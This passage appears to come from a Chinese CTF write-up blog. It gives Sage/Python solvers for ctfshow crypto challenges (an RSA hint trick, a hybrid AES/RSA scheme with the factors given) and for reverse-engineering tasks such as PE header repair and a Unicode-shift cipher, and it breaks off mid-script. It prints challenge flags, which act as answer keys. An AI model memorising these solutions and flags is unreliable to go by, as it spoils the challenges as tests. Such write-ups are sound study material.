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" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#sage</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">c= 48794779998818255539069127767619606491113391594501378173579539128476862598083</span><br><span class="line">hint= 7680157534215495795423318554486996424970862185001934572714615456147511225105</span><br><span class="line">e= 65537</span><br><span class="line">d= 45673813678816865674850575264609274229013439838298838024467777157494920800897</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phic=euler_phi(c)</span><br><span class="line"></span><br><span class="line">print(gcd(e,phic))</span><br><span class="line"></span><br><span class="line">dc=invert(e,phic)</span><br><span class="line"></span><br><span class="line">a=pow(hint,dc,c)</span><br><span class="line"></span><br><span class="line">n=int(a)+int(c)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(int(pow(c,d,n))))</span><br></pre></td></tr></table></figure><p>flag为ctfshow{Oh_u_knOw_4uler}</p><h2 id="5-混合密码体系"><a href="#5-混合密码体系" class="headerlink" title="5 混合密码体系"></a><strong>5 混合密码体系</strong></h2><p>混合密码体系</p><p>AES加密明文，RSA加密AES的密钥</p><p>题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># 库</span><br><span class="line">from Crypto.Util.number import bytes_to_long,getPrime</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad</span><br><span class="line"></span><br><span class="line"># 对称加密</span><br><span class="line">flag = b&#x27;ctfshow&#123;***&#125;&#x27;      # 密文，隐藏</span><br><span class="line">key = b&#x27;flag&#123;***&#125;&#x27;      # 会话密钥，隐藏</span><br><span class="line">iv = b&#x27;flag&#123;1fake_flag&#125;&#x27;       # AES偏移向量，已知</span><br><span class="line"># 对明文进行填充，使其长度符合AES加密的要求</span><br><span class="line">padded_plaintext = pad(flag, AES.block_size)</span><br><span class="line"></span><br><span class="line"># 创建AES加密对象</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"># 加密</span><br><span class="line">ciphertext = cipher.encrypt(padded_plaintext)</span><br><span class="line"></span><br><span class="line"># 加密后的文本通常是字节串，转成整数便于进行会话密钥的RSA加密</span><br><span class="line">c1 = bytes_to_long(ciphertext)</span><br><span class="line"></span><br><span class="line">print(f&#x27;c1 = &#123;c1&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"># 非对称加密</span><br><span class="line">m = bytes_to_long(key)</span><br><span class="line">e = 0x10001</span><br><span class="line">p = getPrime(1024)</span><br><span class="line">q = getPrime(1024)</span><br><span class="line">n = p * q</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(f&#x27;p = &#123;p&#125;&#x27;)</span><br><span class="line">print(f&#x27;q = &#123;q&#125;&#x27;)</span><br><span class="line">print(f&#x27;n = &#123;n&#125;&#x27;)</span><br><span class="line">print(f&#x27;c2 = &#123;c&#125;&#x27;)</span><br><span class="line"># print(&quot;hint:key需要转成字节流也就是b&#x27;&#x27;&quot;)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">c1 = 10274623386006297478525964130173470046355982953419353351509177330015001060887455252482567718546651504491658563014875</span><br><span class="line">p = 126682770761631193509957156425049279522830651950325320826580754739365086374362604934854454428815835196844469535588686149210573266628767888593088817059600076401582225549728184309047483547810100015820325082976781284679340880386138390518973395696206374336712856387090369022746536868747455939074262253452873845903</span><br><span class="line">q = 99825079362327808334563489684167271427241139432727401182808888165552821217781929397837262324242177528386988701584385208395369790542025175917752058047649096340776854252623173162664426065810683048016574420043010318337693586527652970534982946701493024718805916479479658257730226388868060010370893747360166996939</span><br><span class="line">n = 12646117645119414744807511144503229609414192869007113075368323921021672404219693075011763838210400633721060798765473421092201704833591315689681668160927426685183273670665030724394172000165517517884654100267567861284096827407481978978840602383267875832034344793848710383473014512122260278131503985961857107838296047172582364612603344429943715046318283653354068887129071531081918798285138812386418361474496678248683513378861801570673376726388110813411011818940310547686977359605296489433805717348250520973842927175837164120905300831792358190183785344002217291207378744610039145999012939983693891188308725179098958690917</span><br><span class="line">c2 = 5211902378262010726785508340196935051860438587769647187076059600864676774592415052428465708887047312982844957691943180258845015420187239772414768121857728821510440178906193308448250067671679439841031484589864038401572589752057423667532898133171822921282769652197139455317095891357335645435094243006629469245881345449943250189771998449015275390517315432969774421721243965028796050948747282387052634211032729131656214346307483397410725129682422969273915759947596313513270946529649661334582775282060624547405060499311618257517792321792697831000977711752728887999320311631022598717946355057272761740061999974856808147244</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># 库</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import unpad</span><br><span class="line"></span><br><span class="line">c1 = 10274623386006297478525964130173470046355982953419353351509177330015001060887455252482567718546651504491658563014875</span><br><span class="line">p = 126682770761631193509957156425049279522830651950325320826580754739365086374362604934854454428815835196844469535588686149210573266628767888593088817059600076401582225549728184309047483547810100015820325082976781284679340880386138390518973395696206374336712856387090369022746536868747455939074262253452873845903</span><br><span class="line">q = 99825079362327808334563489684167271427241139432727401182808888165552821217781929397837262324242177528386988701584385208395369790542025175917752058047649096340776854252623173162664426065810683048016574420043010318337693586527652970534982946701493024718805916479479658257730226388868060010370893747360166996939</span><br><span class="line">n = 12646117645119414744807511144503229609414192869007113075368323921021672404219693075011763838210400633721060798765473421092201704833591315689681668160927426685183273670665030724394172000165517517884654100267567861284096827407481978978840602383267875832034344793848710383473014512122260278131503985961857107838296047172582364612603344429943715046318283653354068887129071531081918798285138812386418361474496678248683513378861801570673376726388110813411011818940310547686977359605296489433805717348250520973842927175837164120905300831792358190183785344002217291207378744610039145999012939983693891188308725179098958690917</span><br><span class="line">c2 = 5211902378262010726785508340196935051860438587769647187076059600864676774592415052428465708887047312982844957691943180258845015420187239772414768121857728821510440178906193308448250067671679439841031484589864038401572589752057423667532898133171822921282769652197139455317095891357335645435094243006629469245881345449943250189771998449015275390517315432969774421721243965028796050948747282387052634211032729131656214346307483397410725129682422969273915759947596313513270946529649661334582775282060624547405060499311618257517792321792697831000977711752728887999320311631022598717946355057272761740061999974856808147244</span><br><span class="line">e = 0x10001</span><br><span class="line">iv = b&#x27;flag&#123;1fake_flag&#125;&#x27;</span><br><span class="line"></span><br><span class="line"># 非对称解密</span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = pow(c2, d, n)</span><br><span class="line"></span><br><span class="line">key = long_to_bytes(m)</span><br><span class="line">print(key) # flag&#123;**********&#125;</span><br><span class="line"># 对称解密</span><br><span class="line">ciphertext = long_to_bytes(c1)</span><br><span class="line"></span><br><span class="line"># 创建AES解密对象</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"># 解密</span><br><span class="line">plaintext_padded = cipher.decrypt(ciphertext)</span><br><span class="line">print(plaintext_padded)</span><br><span class="line"></span><br><span class="line"># 去除填充,没有这一步也能得到flag</span><br><span class="line">flag = unpad(plaintext_padded, AES.block_size)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>flag</p><p>ctfshow{Hybrid_password_system_is_chaos}</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h3><p>非预期：打开IDA</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240708171017813.png" alt="image-20240708171017813"><br>不过都考PE修复了，学一学</p><p>：<a href="http://t.csdnimg.cn/14ygR">http://t.csdnimg.cn/14ygR</a></p><p>文件头：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00</span><br><span class="line">B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 F8 00 00 00</span><br></pre></td></tr></table></figure><p>主要是这个：<img src="https://img-blog.csdnimg.cn/20201213104311755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NsYzExMTI=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="一个西瓜切两半你一半我一半"><a href="#一个西瓜切两半你一半我一半" class="headerlink" title="一个西瓜切两半你一半我一半"></a>一个西瓜切两半你一半我一半</h3><p>没想到key是” 一个西瓜切两半你一半我一半“愣愣用之前的key，怪不得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: GBK -*-</span></span><br><span class="line"></span><br><span class="line">crypt = <span class="string">&quot;乃乾觅甯剏乳厡侻丨厏扝乌博丿乜规甲剌乶厝侥丿卻扚丠厘丿乎覟瓬剤&quot;</span></span><br><span class="line">key = <span class="string">&quot;一个西瓜切两半你一半我一半&quot;</span></span><br><span class="line">tmp = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(crypt)):</span><br><span class="line">    tmp += <span class="built_in">chr</span>((<span class="built_in">ord</span>(crypt[i]) - <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">0x110000</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) + <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h3><p>?暴力？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 